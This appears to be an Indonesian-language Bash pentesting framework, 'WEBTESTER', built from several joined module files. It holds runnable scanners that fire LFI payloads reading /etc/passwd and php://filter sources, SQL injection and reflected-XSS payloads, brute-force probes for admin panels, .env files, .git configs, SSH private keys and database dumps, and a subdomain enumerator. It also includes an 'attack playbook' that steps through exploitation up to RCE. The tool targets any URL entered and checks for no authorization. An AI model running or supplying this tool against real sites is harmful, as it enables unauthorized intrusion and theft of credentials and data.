#!/bin/bash

# =====================================================
#        WEBTESTER v1.0 - PROFESSIONAL FRAMEWORK      
#   "International Standardization Pentesting Tool"
# =====================================================

# --- [ SISTEM PENDUKUNG ] ---

function disable_sleep {
    if command -v caffeinate &> /dev/null; then
        caffeinate -i & 
        sleep_pid=$!
    elif command -v xset &> /dev/null; then
        xset s off -dpms
    fi
}

function enable_sleep {
    if [[ -n $sleep_pid ]]; then
        kill $sleep_pid &> /dev/null
    elif command -v xset &> /dev/null; then
        xset s on +dpms
    fi
}
#!/bin/bash

# --- [ PALET WARNA HACKING (PROFESSIONAL) ] ---

# Warna Utama (Cerah/Bold)
export R='\e[1;31m'         # Red (Gagal / Vulnerable)
export G='\e[1;32m'         # Green (Sukses / Found)
export Y='\e[1;33m'         # Yellow (Peringatan / Warning)
export B='\e[1;34m'         # Blue (Header)
export P='\e[1;35m'         # Purple (WAF / Filter)
export C='\e[1;36m'         # Cyan (Proses / Info)
export W='\e[1;37m'         # White (Teks Utama)

# Warna Gelap/Redup (Untuk Detail/Log yang tidak kritis)
export DG='\e[90m'          # Dark Gray (Alamat file/Timestamp)
export DR='\e[0;31m'         # Dark Red (Info teknis error)
export DC='\e[0;36m'         # Dark Cyan (Sub-menu)

# Efek Khusus
export NC='\e[0m'           # Reset Warna
export BOLD='\e[1m'         # Tebal tanpa warna
export UNDERLINE='\e[4m'    # Garis bawah
export BLINK='\e[5m'        # Berkedip (Gunakan hanya untuk VULN!)

# Simbol Konsisten
export OK="${G}[+]${NC}"
export ERR="${R}[-]${NC}"
export WARN="${Y}[!]${NC}"
export INFO="${C}[*]${NC}"
export Q="${Y}[?]${NC}"

#!/bin/bash
# --- [ MODUL 01: LFI SCANNER ] ---
function start_scanner {
    clear
    local nama_modul="LFI SCANNER"
    
    # Header Estetik
    echo -e "${C}============================================================================="
    echo -e "                 MODUL 01: LOCAL FILE INCLUSION (LFI) SCANNER PRO             "
    echo -e "=============================================================================${NC}"
    
    echo -e "${WARN} APA ITU LFI?"
    echo -e "${DG}ID: Kerentanan pada parameter URL yang mengizinkan pembacaan file internal server."
    echo -e "${DG}EN: Vulnerability in URL parameters allowing unauthorized local file access."
    echo -e "${NC}-----------------------------------------------------------------------------"

    echo -ne "${Q} Masukkan URL Target (contoh: http://site.com/v.php?id=): ${W}"
    read target

    # Validasi Input
    if [[ -z "$target" ]]; then
        echo -e "${ERR} URL tidak boleh kosong!"; return
    fi
    if [[ "$target" != *"="* ]]; then
        echo -e "${WARN} Peringatan: URL mungkin butuh parameter (contoh: ?page=)"
    fi

    # Logika Penamaan File & Normalisasi
    domain_clean=$(echo "$target" | sed -e 's|^[^/]*//||' -e 's|/.*$||' | cut -d'.' -f1)
    log_file="${domain_clean^^}_LFI_AUDIT.txt"
    ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0"

    # Payload List
    paths=("/etc/passwd" "/etc/hosts" "../../../../../../../../etc/passwd" "../../../../../../../../etc/passwd%00" "....//....//....//....//etc/passwd" "php://filter/convert.base64-encode/resource=index.php" "php://input" "/proc/self/environ" "C:\Windows\win.ini" "/etc/issue")

    echo -e "\n${INFO} Target   : ${W}$target"
    echo -e "${INFO} Log File : ${DG}$log_file${NC}"
    echo "-----------------------------------------------------------------------------"

    # Inisialisasi Log
    {
        echo "LFI DETAILED AUDIT REPORT"
        echo "TARGET : $target"
        echo "DATE   : $(date)"
        echo "---------------------------------------------------------------------"
        printf "%-10s | %-50s | %-15s\n" "HTTP" "PAYLOAD" "RESULT"
        echo "---------------------------------------------------------------------"
    } > "$log_file"

    found=0
    total=${#paths[@]}
    index=0

    for path in "${paths[@]}"; do
        ((index++))
        # UI Progress
        echo -ne "  ${INFO} Scanning [$index/$total]...\r"
        
        tmp_res=$(mktemp)
        http_code=$(curl -s -k -L -A "$ua" --connect-timeout 6 -o "$tmp_res" -w "%{http_code}" "$target$path")
        response=$(cat "$tmp_res")
        rm -f "$tmp_res"

        status="SECURE"
        log_status="SECURE"
        
        # Logika Deteksi
        if [[ "$response" == *"root:x:0:0"* || "$response" == *"[extensions]"* || "$response" == *"PD9waHA"* || "$response" == *"127.0.0.1"* ]]; then
            status="${G}${BOLD}VULNERABLE!${NC}"
            log_status="VULNERABLE"
            echo -e "  ${OK} ${W}$http_code | ${C}$path ${W}-> $status"
            ((found++))
        elif [[ "$http_code" == "403" || "$http_code" == "406" ]]; then
            status="${P}WAF DETECTED${NC}"
            log_status="WAF/BLOCKED"
        fi

        if [[ "$log_status" != "SECURE" ]]; then
            printf "%-10s | %-50s | %-15s\n" "$http_code" "$path" "$log_status" >> "$log_file"
        fi
    done

    echo -e "${NC}-----------------------------------------------------------------------------"
    if [ $found -gt 0 ]; then
        echo -e "${OK} ${G}${BOLD}SELESAI! Ditemukan $found celah potensial.${NC}"
        echo "TOTAL VULNERABILITIES FOUND: $found" >> "$log_file"
    else
        echo -e "${ERR} ${R}SELESAI. Tidak ditemukan celah dasar.${NC}"
        echo "RESULT: NO BASIC VULN FOUND" >> "$log_file"
    fi
    
    echo -e "\n${INFO} Log tersimpan di: ${DG}$log_file"
    echo -e "${C}Tekan Enter untuk kembali ke menu.${NC}"
    read
}

# --- [ MODUL 02: SQLI INJECTION (VISUAL UPGRADE) ] ---
function start_sqli_tester {
    clear
    local nama_modul="SQLI TESTER PRO"
    
    # Header Professional
    echo -e "${B}============================================================================="
    echo -e "                ${W}${BOLD}MODUL 02: SQL INJECTION (SQLi) MULTI-STRATEGY${NC}                "
    echo -e "${B}=============================================================================${NC}"
    
    echo -ne "${Q} Masukkan URL Target (dengan parameter): ${W}"
    read target

    if [[ -z "$target" ]]; then 
        echo -e "${ERR} URL tidak boleh kosong!"; return
    fi

    # Persiapan metadata
    domain_clean=$(echo "$target" | sed -e 's|^[^/]*//||' -e 's|/.*$||' | cut -d'.' -f1)
    log_file="${domain_clean^^}_SQLI_FULL_AUDIT.txt"
    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

    # Analisis awal
    echo -e "${INFO} Menganalisis respon dasar target..."
    base_res=$(curl -s -k -L -A "$user_agent" --connect-timeout 10 "$target")
    base_size=${#base_res}

    # Daftar Payload
    sqli_payloads=(
        "'" "\"" "')" "'))" 
        "' OR 1=1--" "' AND 1=2--" "/**/AND/**/1=1"
        "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--" 
        "'; WAITFOR DELAY '0:0:5'--" 
        "\" SLEEP(5) #"
    )

    total_payloads=${#sqli_payloads[@]}
    
    echo -e "\n${INFO} Target      : ${W}$target"
    echo -e "${INFO} Total Test  : ${C}$total_payloads Payloads"
    echo -e "${INFO} File Log    : ${DG}$log_file${NC}"
    echo "-----------------------------------------------------------------------------"

    # Setup Log File
    {
        echo "SQLi REPORT - $target - $(date)"
        printf "%-25s | %-6s | %-15s\n" "PAYLOAD" "CODE" "STATUS"
    } > "$log_file"

    found=0
    current=1

    for polyglot in "${sqli_payloads[@]}"; do
        # --- [ VISUAL PROGRESS BAR & COUNTER ] ---
        percent=$(( current * 100 / total_payloads ))
        bar_size=$(( percent / 4 ))
        bar=$(printf "%${bar_size}s" | tr ' ' '=')
        
        # Cetak baris progres (di-overwrite terus menerus dengan \r)
        printf "\r${INFO} Progress: [${G}%-25s${NC}] %d%% [%d/%d]" "$bar" "$percent" "$current" "$total_payloads"
        
        tmp_file=$(mktemp)
        start_time=$(date +%s)
        
        # Eksekusi
        http_code=$(curl -s -k -L -A "$user_agent" --connect-timeout 15 -o "$tmp_file" -w "%{http_code}" "$target$polyglot")
        
        end_time=$(date +%s)
        duration=$((end_time - start_time))
        response=$(cat "$tmp_file")
        res_size=${#response}
        size_diff=$((res_size - base_size))
        rm -f "$tmp_file"

        status="NORMAL"
        msg_color="${DG}"

        # Logika Deteksi (Sama seperti sebelumnya)
        if [ $duration -ge 5 ]; then
            status="VULN (TIME-BASED)"; msg_color="${P}${BLINK}"; ((found++))
        elif echo "$response" | grep -qiE "mysql_|SQL syntax|Unclosed|PostgreSQL|Oracle|MariaDB|Syntax error"; then
            status="VULN (ERROR-BASED)"; msg_color="${R}${BOLD}"; ((found++))
        elif [[ "$polyglot" == *"1=1"* && ${size_diff#-} -gt 50 ]]; then
            status="POTENTIAL BLIND"; msg_color="${Y}"; ((found++))
        elif [[ "$http_code" == "403" ]]; then
            status="WAF BLOCKED"; msg_color="${P}"
        fi

        # Jika ditemukan sesuatu, cetak di baris baru agar tidak tertimpa progress bar
        if [[ "$status" != "NORMAL" ]]; then
            echo -e "\n  ${OK} [${current}] Found: ${msg_color}${status}${NC} | Payload: ${W}${polyglot}${NC}"
            printf "%-25s | %-6s | %-15s\n" "$polyglot" "$http_code" "$status" >> "$log_file"
        fi
        
        ((current++))
        sleep 0.2
    done

    echo -e "\n-----------------------------------------------------------------------------"
    if [ $found -gt 0 ]; then
        echo -e "${OK} ${G}${BOLD}SELESAI! $found indikasi ditemukan.${NC}"
    else
        echo -e "${ERR} ${R}Tidak ada celah dasar yang ditemukan.${NC}"
    fi
    
    echo -e "\n${C}Tekan Enter untuk kembali...${NC}"
    read
}


# --- [ MODUL 02: STRATEGY PLAYBOOK ] ---
function show_strategy {
    clear
    # Header menggunakan warna Cyan (C) agar terlihat profesional
    echo -e "${C}============================================================================="
    echo -e "           ${BOLD}WEBTESTER COMPLETE ATTACK PLAYBOOK (FULL 20 MODULES)${NC}${C}          "
    echo -e "=============================================================================${NC}"
    
    # FASE 1 - Reconnaissance
    echo -e "${P}[ FASE 1: RECONNAISSANCE - Pengumpulan Informasi ]${NC}"
    echo -e " ${C}06${NC} -> Cari semua Subdomain untuk memperluas target."
    echo -e " ${C}08${NC} -> Scan Port & Service untuk melihat pintu masuk (SSH, FTP, HTTP)."
    echo -e " ${C}13${NC} -> Cek apakah ada Subdomain yang bisa diambil alih (Takeover)."
    echo ""

    # FASE 2 - Content Discovery
    echo -e "${P}[ FASE 2: CONTENT DISCOVERY - Pemetaan Struktur ]${NC}"
    echo -e " ${C}07${NC} -> Brute-force Folder/Direktori tersembunyi."
    echo -e " ${C}04${NC} -> Cari halaman Admin khusus (Admin Panel Finder)."
    echo -e " ${C}15${NC} -> Temukan Endpoint API (REST/GraphQL) yang sering terlupakan."
    echo -e " ${C}09${NC} -> Identifikasi CMS (WP/Joomla) dan cari celah spesifiknya."
    echo ""

    # FASE 3 - Vulnerability Scanning
    echo -e "${P}[ FASE 3: VULNERABILITY SCANNING - Pencarian Celah ]${NC}"
    echo -e " ${C}05${NC} -> Hunting file sensitif (.env, .git, .sql) secara langsung."
    echo -e " ${C}01${NC} -> Eksploitasi ${R}LFI${NC} jika ada parameter file."
    echo -e " ${C}02${NC} -> Uji ${R}SQL Injection${NC} untuk menembus database."
    echo -e " ${C}03${NC} -> Uji ${R}XSS${NC} untuk menyerang sisi client/user."
    echo ""

    # FASE 4 - Advanced Exploitation
    echo -e "${P}[ FASE 4: ADVANCED EXPLOITATION - Penetrasi Dalam ]${NC}"
    echo -e " ${C}11${NC} -> Gunakan ${Y}SSRF${NC} untuk memukul server internal dari dalam."
    echo -e " ${C}16${NC} -> Uji ${Y}IDOR${NC} (Broken Access Control) untuk akses data user lain."
    echo -e " ${C}17${NC} -> Lakukan ${Y}HTTP Smuggling${NC} untuk memanipulasi Load Balancer."
    echo -e " ${C}18${NC} -> Debug dan hack ${Y}JWT Token${NC} untuk bypass login."
    echo -e " ${C}10${NC} -> Jika memungkinkan, eksekusi perintah sistem (${R}${BLINK}RCE${NC})."
    echo ""

    # FASE 5 - Post-Exploitation
    echo -e "${P}[ FASE 5: POST-EXPLOITATION & ANALYSIS ]${NC}"
    echo -e " ${C}12${NC} -> Cek miskonfigurasi ${DG}CORS${NC} untuk pencurian data antar domain."
    echo -e " ${C}14${NC} -> Cari bucket Cloud (${DG}S3/GCP${NC}) yang terbuka publik."
    echo -e " ${C}19${NC} -> Analisis Security Headers & SSL untuk celah enkripsi."
    echo -e " ${C}20${NC} -> Bedah file JavaScript untuk menemukan API Keys rahasia."
    echo ""

    echo -e "${C}=============================================================================${NC}"
    echo -e " ${WARN} ${BOLD}TIPS:${NC} Mulailah dari ${G}Fase 1${NC} ke ${G}Fase 5${NC} untuk hasil penetrasi maksimal."
    echo -e "${C}=============================================================================${NC}"
    
    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke Menu Utama...${NC}"
    read
}

# --- [ MODUL 03: XSS REFLECTED SCANNER PRO ] ---
function start_xss_scanner {
    clear
    local nama_modul="XSS SCANNER PRO"
    
    # Header Professional
    echo -e "${C}============================================================================="
    echo -e "                ${W}${BOLD}MODUL 03: XSS REFLECTED (CONTEXT-AWARE)${NC}                "
    echo -e "${C}=============================================================================${NC}"

    echo -ne "${Q} Masukkan URL Target (contoh: http://site.com/search.php?q=): ${W}"
    read target

    if [[ -z "$target" ]]; then echo -e "${ERR} URL Kosong!"; return; fi

    # Log & Meta
    local domain=$(echo "$target" | awk -F[/:] '{print $4}')
    [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
    local filename="${domain_clean^^}_XSS_PRO.txt"
    local ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0"

    # 1. ANALISIS AWAL (Sanitization Check)
    echo -e "${INFO} Menganalisis tingkat sanitasi filter..."
    test_chars="<>'\"()"
    encoded_test=$(echo -ne "$test_chars" | python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read()))")
    check_res=$(curl -s -k -L -A "$ua" "$target$encoded_test")
    
    echo -ne "${INFO} Status Filter: "
    [[ "$check_res" == *"<"* ]] && echo -ne "${G}[< OK] ${NC}" || echo -ne "${R}[< FILTERED] ${NC}"
    [[ "$check_res" == *"'"* ]] && echo -ne "${G}[' OK] ${NC}" || echo -ne "${R}[' FILTERED] ${NC}"
    echo ""

    # 2. PAYLOAD TERSTRUKTUR
    xss_payloads=(
        "<script>alert(1)</script>"            # Basic Tag
        "\"><script>alert(1)</script>"          # Tag Breakout
        "';alert(1)//"                          # JS Context
        "\"-alert(1)-\""                        # Attribute Context
        "<img src=x onerror=alert(1)>"          # Event Handler
        "<svg/onload=alert(1)>"                 # SVG Payload
        "\"><details/open/ontoggle=confirm(1)>" # Modern Bypass
        "javascript:alert(1)"                   # Protocol Handler
    )

    total=${#xss_payloads[@]}
    found_xss=0
    current=1

    # Inisialisasi Log
    {
        echo "XSS ADVANCED AUDIT - $target"
        echo "---------------------------------------------------------------------"
        printf "%-40s | %-15s | %-10s\n" "PAYLOAD" "RESULT" "HTTP"
    } > "$filename"

    echo -e "-----------------------------------------------------------------------------"

    # 3. LOOPING SCAN DENGAN VISUAL PROGRESS
    for payload in "${xss_payloads[@]}"; do
        # Progress Bar logic
        percent=$(( current * 100 / total ))
        bar_len=$(( percent / 5 ))
        bar=$(printf "%${bar_len}s" | tr ' ' '=')
        
        printf "\r${INFO} Progress: [${C}%-20s${NC}] %d%% [%d/%d]" "$bar" "$percent" "$current" "$total"

        # URL Encoding
        encoded=$(echo -ne "$payload" | python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read()))")
        
        # Request
        tmp_res=$(mktemp)
        http_code=$(curl -s -k -L -A "$ua" --connect-timeout 7 -o "$tmp_res" -w "%{http_code}" "$target$encoded")
        response=$(cat "$tmp_res")
        rm -f "$tmp_res"

        status="SAFE"
        msg_color="${DG}"

        # 4. INTELLIGENT DETECTION
        if [[ "$response" == *"$payload"* ]]; then
            status="VULNERABLE"
            msg_color="${R}${BOLD}"
            ((found_xss++))
            # Cetak hasil temuan agar tidak tertutup progress bar
            echo -e "\n  ${OK} [${current}] ${G}MATCH FOUND!${NC}"
            echo -e "     ╰─> Context: ${W}${payload:0:20}...${NC} | Status: ${R}Reflected${NC}"
        elif [[ "$http_code" == "403" ]]; then
            status="WAF BLOCKED"
            msg_color="${P}"
        fi

        printf "%-40s | %-15s | %-10s\n" "$payload" "$status" "$http_code" >> "$filename"
        
        ((current++))
        sleep 0.1
    done

    # 5. FINAL REPORT
    echo -ne "\r                                                                                \r"
    echo -e "-----------------------------------------------------------------------------"
    if [ $found_xss -gt 0 ]; then
        echo -e "${OK} ${G}${BOLD}SCAN SELESAI! $found_xss celah ditemukan.${NC}"
        echo -e "${WARN} ${Y}Gunakan Burp Suite untuk verifikasi manual.${NC}"
    else
        echo -e "${ERR} ${R}Tidak ditemukan pantulan payload secara langsung.${NC}"
    fi
    echo -e "${INFO} Laporan Lengkap: ${W}$filename${NC}"
    
    echo -e "\n${C}Tekan Enter untuk kembali.${NC}"
    read
}

# --- [ MODUL 04: ADMIN PANEL FINDER PRO ] ---
function start_admin_finder {
    clear
    local nama_modul="ADMIN FINDER PRO"
    
    # Header Professional
    echo -e "${B}============================================================================="
    echo -e "                ${W}${BOLD}MODUL 04: ADMIN PANEL FINDER (ULTRA-FAST)${NC}                "
    echo -e "${B}=============================================================================${NC}"

    echo -ne "${Q} Masukkan URL Target (contoh: http://site.com/): ${W}"
    read target
    if [[ -z "$target" ]]; then echo -e "${ERR} URL Kosong!"; return; fi
    [[ "${target: -1}" != "/" ]] && target="$target/"

    # Meta & Log Setup
    local domain=$(echo "$target" | awk -F[/:] '{print $4}')
    [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
    local filename="${domain_clean^^}_ADMIN_PRO.txt"
    local ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0"

    # 1. ANTI-FALSE POSITIVE CHECK
    echo -e "${INFO} Memeriksa kejujuran respon server..."
    local random_path="check_$(date +%s%N | cut -b1-8)/"
    local check_code=$(curl -s -o /dev/null -w "%{http_code}" -k -L -A "$ua" "$target$random_path")
    
    if [[ "$check_code" == "200" ]]; then
        echo -e "${WARN} ${Y}Peringatan: Server merespon 200 OK untuk path acak.${NC}"
        echo -e "${INFO} Skrip akan menggunakan validasi konten (Keyword Check)."
        local mode="keyword"
    else
        echo -e "${OK} Server tervalidasi. Menggunakan mode HTTP Code."
        local mode="standard"
    fi

    # 2. WORDLIST EXPANSION
    admin_paths=(
        # --- [ Modern Backend Frameworks ] ---
        "strapi/" "ghost/" "keystone/" "directus/" "wagtail/" "filament/"
        
        # --- [ Enterprise & SSO ] ---
        "sso/" "saml/" "okta/" "auth0/" "oauth/" "idp/" "identity/"
        "login-portal/" "internal/" "employee/" "portal/" "gateway/"
        
        # --- [ Infrastructure & DevOps ] ---
        "grafana/" "prometheus/" "kibana/" "dashboard/" "status/" 
        "jenkins/" "gitlab/" "traefik/" "portainer/" "consul/"
        
        # --- [ API & Development ] ---
        "swagger/" "doc/" "docs/" "api-docs/" "v1/api-docs/" "graphiql/"
        "sandbox/" "staging/" "dev/" "test/" "env/" ".env"
        
        # --- [ Obscure Paths (Sering dipakai Enterprise) ] ---
        "management/" "control/" "remote/" "secure/" "private/" 
        "backend_v2/" "cms_v3/" "main_control/" "staff_only/"
        
        # --- [ CMS & E-Commerce Specifc ] ---
        "magento_admin/" "shop_admin/" "storefront/" "bigcommerce/"
        "umbraco/" "sitecore/" "adobe-experience-manager/" "aem/"
    )
    
    total=${#admin_paths[@]}
    found_admin=0
    current=1

    echo -e "-----------------------------------------------------------------------------"
    
    # 3. SCANNING LOOP WITH VISUALS
    for path in "${admin_paths[@]}"; do
        # Progress Bar
        percent=$(( current * 100 / total ))
        bar_len=$(( percent / 5 ))
        bar=$(printf "%${bar_len}s" | tr ' ' '=')
        printf "\r${INFO} Scanning: [${B}%-20s${NC}] %d%% [%d/%d]" "$bar" "$percent" "$current" "$total"

        # Request
        tmp_res=$(mktemp)
        status_code=$(curl -s -k -L -A "$ua" --connect-timeout 5 -o "$tmp_res" -w "%{http_code}" "$target$path")
        content=$(cat "$tmp_res")
        rm -f "$tmp_res"

        is_found=false
        # Logika Validasi (Jika mode keyword, cari kata 'login' atau 'password')
        if [[ "$mode" == "keyword" ]]; then
            if [[ "$status_code" == "200" ]] && echo "$content" | grep -qiE "login|password|username|admin"; then
                is_found=true
            fi
        else
            if [[ "$status_code" == "200" || "$status_code" == "401" ]]; then
                is_found=true
            fi
        fi

        # Jika ditemukan
        if [ "$is_found" = true ]; then
            echo -e "\n  ${OK} ${G}DITEMUKAN:${NC} ${W}$target$path${NC} [${G}$status_code${NC}]"
            echo "URL: $target$path | CODE: $status_code" >> "$filename"
            ((found_admin++))
        fi

        ((current++))
        sleep 0.02
    done

    # 4. FINAL REPORT
    echo -ne "\r                                                                                \r"
    echo -e "-----------------------------------------------------------------------------"
    if [ $found_admin -gt 0 ]; then
        echo -e "${OK} ${G}${BOLD}Scan Selesai! $found_admin lokasi ditemukan.${NC}"
    else
        echo -e "${ERR} ${R}Halaman admin tidak ditemukan dalam wordlist ini.${NC}"
    fi
    echo -e "${INFO} Hasil disimpan di: ${DG}$filename${NC}"
    
    echo -e "\n${C}Tekan Enter untuk kembali.${NC}"
    read
}
# --- [ MODUL 05: SENSITIVE FILE & SECRET HUNTER PRO ] ---
function start_secret_hunter {
    clear
    local nama_modul="SECRET HUNTER PRO"
    
    # Header Professional
    echo -e "${P}============================================================================="
    echo -e "                ${W}${BOLD}MODUL 05: SENSITIVE FILE & SECRET HUNTER${NC}                "
    echo -e "${P}=============================================================================${NC}"

    echo -ne "${Q} Masukkan URL Target (contoh: http://site.com/): ${W}"
    read target
    if [[ -z "$target" ]]; then echo -e "${ERR} URL Kosong!"; return; fi
    [[ "${target: -1}" != "/" ]] && target="$target/"

    # Meta & Log Setup
    local domain=$(echo "$target" | awk -F[/:] '{print $4}')
    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
    local filename="${domain_clean^^}_SECRET_PRO.txt"
    local ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0"

    # Wordlist yang diperluas (High Value Targets)
    secrets=(
        ".env" ".env.bak" ".env.old" ".env.example" "docker-compose.yml"
        ".git/config" ".git/index" ".svn/entries" ".htaccess" "web.config"
        "phpinfo.php" "info.php" "test.php" "_info.php"
        "database.sql" "db.sql" "backup.sql" "dump.sql" "data.sql"
        "backup.zip" "www.zip" "latest.zip" "backup.tar.gz" "project.zip"
        "package.json" "composer.json" ".npmrc" ".ssh/id_rsa"
        "config/database.php" "app/config/parameters.yml" ".vscode/settings.json"
    )

    total=${#secrets[@]}
    found_secrets=0
    current=1

    echo -e "${INFO} Memulai Deep Hunting pada: ${W}$target"
    echo "-----------------------------------------------------------------------------"

    # Header Log
    {
        echo "SENSITIVE DATA AUDIT - $target"
        echo "---------------------------------------------------------------------"
        printf "%-30s | %-6s | %-10s | %-15s\n" "PATH" "CODE" "SIZE" "LEAK INFO"
    } > "$filename"

    # --- LOOP SCANNING ---
    for file in "${secrets[@]}"; do
        # Visual Progress (Purple Theme for Secrets)
        percent=$(( current * 100 / total ))
        bar_len=$(( percent / 5 ))
        bar=$(printf "%${bar_len}s" | tr ' ' '=')
        printf "\r${INFO} Hunting: [${P}%-20s${NC}] %d%% [%d/%d]" "$bar" "$percent" "$current" "$total"

        # Request & Header Analysis
        tmp_res=$(mktemp)
        response=$(curl -s -k -L -A "$ua" --connect-timeout 6 -o "$tmp_res" -w "%{http_code}:%{size_download}:%{content_type}" "$target$file")
        
        status_code=$(echo $response | cut -d':' -f1)
        file_size=$(echo $response | cut -d':' -f2)
        content_type=$(echo $response | cut -d':' -f3)
        body=$(cat "$tmp_res" | head -n 20) # Ambil 20 baris pertama untuk validasi
        rm -f "$tmp_res"

        is_leak=false
        leak_msg="-"

        # LOGIKA DETEKSI PINTAR
        if [[ "$status_code" == "200" && "$file_size" -gt 2 ]]; then
            # Validasi Konten (Hindari false positive 200 OK dari halaman 404 palsu)
            if [[ "$file" == *".env"* ]] && echo "$body" | grep -qiE "DB_|APP_|SECRET|AWS_"; then
                is_leak=true; leak_msg="CRITICAL (Env Vars)"
            elif [[ "$file" == *".git"* ]] && echo "$body" | grep -qi "repositoryformatversion"; then
                is_leak=true; leak_msg="HIGH (Git Repo)"
            elif [[ "$content_type" == *"application/octet-stream"* || "$content_type" == *"application/zip"* ]]; then
                is_leak=true; leak_msg="MEDIUM (Binary/Archive)"
            elif echo "$body" | grep -qiE "<?php|index of|database|ssh-rsa"; then
                is_leak=true; leak_msg="POTENTIAL LEAK"
            fi
        fi

        # Jika ditemukan sesuatu yang valid
        if [ "$is_leak" = true ]; then
            echo -e "\n  ${OK} ${R}${BOLD}ALERT:${NC} ${W}/$file ${G}($file_size bytes)${NC}"
            echo -e "     ╰─> Type: ${P}$leak_msg${NC} | MIME: $content_type"
            printf "%-30s | %-6s | %-10s | %-15s\n" "/$file" "$status_code" "$file_size" "$leak_msg" >> "$filename"
            ((found_secrets++))
        fi

        ((current++))
        sleep 0.03
    done

    # --- FINAL REPORT ---
    echo -ne "\r                                                                                \r"
    echo -e "-----------------------------------------------------------------------------"
    if [ $found_secrets -gt 0 ]; then
        echo -e "${OK} ${G}${BOLD}SELESAI! $found_secrets Data sensitif ditemukan.${NC}"
        echo -e "${WARN} ${Y}Segera amankan file-file tersebut dari akses publik!${NC}"
    else
        echo -e "${ERR} ${R}Tidak ditemukan file sensitif yang bocor secara publik.${NC}"
    fi
    echo -e "${INFO} Laporan Lengkap: ${W}$filename${NC}"
    
    echo -e "\n${C}Tekan Enter untuk kembali.${NC}"
    read
}

# --- [ MODUL 06: SUBDOMAIN ENUMERATOR PRO ] ---
function start_subdomain_scanner {
    clear
    local nama_modul="SUBDOMAIN SCANNER PRO"
    
    # Header Professional
    echo -e "${C}============================================================================="
    echo -e "                ${W}${BOLD}MODUL 06: SUBDOMAIN ENUMERATOR (INTEL MODE)${NC}                "
    echo -e "${C}=============================================================================${NC}"

    echo -ne "${Q} Masukkan Domain Utama (contoh: site.com): ${W}"
    read domain
    if [[ -z "$domain" ]]; then echo -e "${ERR} Domain Kosong!"; return; fi

    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
    local filename="${domain_clean^^}_SUB_INTEL.txt"
    local ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    # 1. PASSIVE DISCOVERY (crt.sh)
    echo -ne "${INFO} Melakukan Passive Discovery (SSL Logs)... "
    passive_list=$(curl -s "https://crt.sh/?q=%25.$domain&output=json" | grep -Po '"name_value":"\K[^"]*' | sed 's/\*\.//g' | sort -u)
    echo -e "${G}Done!${NC}"

    # 2. WORDLIST EXPANSION (Enterprise Grade)
    subs_brute=("www" "dev" "test" "api" "staging" "admin" "mail" "blog" "v1" "v2" "shop" "internal" "portal" "cloud" "vpn" "secure" "m" "autodiscover" "sms" "remote" "crm" "erp" "jira" "git" "devops" "jenkins" "docker" "kubernetes")
    
    # Merge and Deduplicate
    mapfile -t all_subs < <(echo -e "${passive_list}\n$(printf "%s.$domain\n" "${subs_brute[@]}")" | sort -u)
    total=${#all_subs[@]}
    found_count=0
    current=1

    echo -e "${INFO} Memulai DNS Resolving & HTTP Validation..."
    echo "-----------------------------------------------------------------------------"

    # Setup Log Header
    {
        echo "SUBDOMAIN ENUMERATION REPORT - $domain"
        echo "---------------------------------------------------------------------------"
        printf "%-30s | %-15s | %-6s | %-10s\n" "SUBDOMAIN" "IP ADDRESS" "HTTP" "SERVER"
    } > "$filename"

    # --- SCANNING LOOP ---
    for s_clean in "${all_subs[@]}"; do
        # Visual Progress Bar
        percent=$(( current * 100 / total ))
        bar_len=$(( percent / 5 ))
        bar=$(printf "%${bar_len}s" | tr ' ' '=')
        printf "\r${INFO} Progress: [${C}%-20s${NC}] %d%% [%d/%d]" "$bar" "$percent" "$current" "$total"

        # DNS Check
        ip=$(dig +short "$s_clean" | tail -n1)
        
        if [[ -z "$ip" ]]; then
            # Cek sekali lagi dengan getent jika dig gagal
            ip=$(getent hosts "$s_clean" | awk '{print $1}')
        fi

        if [[ -n "$ip" ]]; then
            # 3. HTTP VALIDATION (Cek apakah web server hidup)
            # Kita cek port 80 dan 443
            http_info=$(curl -I -s -k -L -A "$ua" --connect-timeout 3 "$s_clean" | grep -iE "^HTTP|^Server" | tr '\r\n' ' ')
            http_code=$(echo "$http_info" | grep -Po 'HTTP/\d\.\d \K\d{3}' | head -n1)
            server_type=$(echo "$http_info" | grep -Po 'Server: \K[^ ]*' | head -n1)
            [[ -z "$server_type" ]] && server_type="Unknown"
            [[ -z "$http_code" ]] && http_code="---"

            echo -e "\n  ${OK} ${G}ACTIVE:${NC} ${W}$s_clean${NC}"
            echo -e "     ╰─> IP: ${C}$ip${NC} | Code: ${Y}$http_code${NC} | Srv: ${DG}$server_type${NC}"
            
            printf "%-30s | %-15s | %-6s | %-10s\n" "$s_clean" "$ip" "$http_code" "$server_type" >> "$filename"
            ((found_count++))
        fi

        ((current++))
        # Sleep kecil agar tidak dianggap DoS oleh DNS resolver lokal
        sleep 0.02
    done

    # --- FINAL REPORT ---
    echo -ne "\r                                                                                \r"
    echo -e "-----------------------------------------------------------------------------"
    if [ $found_count -gt 0 ]; then
        echo -e "${OK} ${G}${BOLD}SELESAI! $found_count subdomain aktif ditemukan.${NC}"
    else
        echo -e "${ERR} ${R}Tidak ditemukan subdomain aktif.${NC}"
    fi
    echo -e "${INFO} Laporan Lengkap: ${W}$filename${NC}"
    
    echo -e "\n${C}Tekan Enter untuk kembali.${NC}"
    read
}
